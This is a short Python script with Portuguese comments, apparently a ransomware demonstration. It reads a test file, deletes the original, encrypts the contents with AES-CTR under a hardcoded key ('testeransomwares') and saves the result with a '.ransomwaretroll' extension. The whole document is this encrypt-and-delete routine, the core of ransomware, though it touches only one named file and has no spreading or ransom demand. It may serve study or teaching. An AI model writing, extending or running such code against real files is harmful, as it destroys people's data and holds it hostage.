import os
import pyaes

# Nome do arquivo
file_name = "teste.txt"

# Verificar se o arquivo existe
if not os.path.exists(file_name):
    print(f"Arquivo {file_name} não encontrado.")
    exit()

# Abrir o arquivo a ser criptografado
with open(file_name, "rb") as file:
    file_data = file.read()

# Remover o arquivo original
os.remove(file_name)

# Chave de criptografia
key = b"testeransomwares"  # 16 bytes
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografar o arquivo
crypto_data = aes.encrypt(file_data)

# Salvar o arquivo criptografado
new_file_name = file_name + ".ransomwaretroll"
with open(new_file_name, 'wb') as new_file:
    new_file.write(crypto_data)

print(f"Arquivo {file_name} foi criptografado como {new_file_name}.")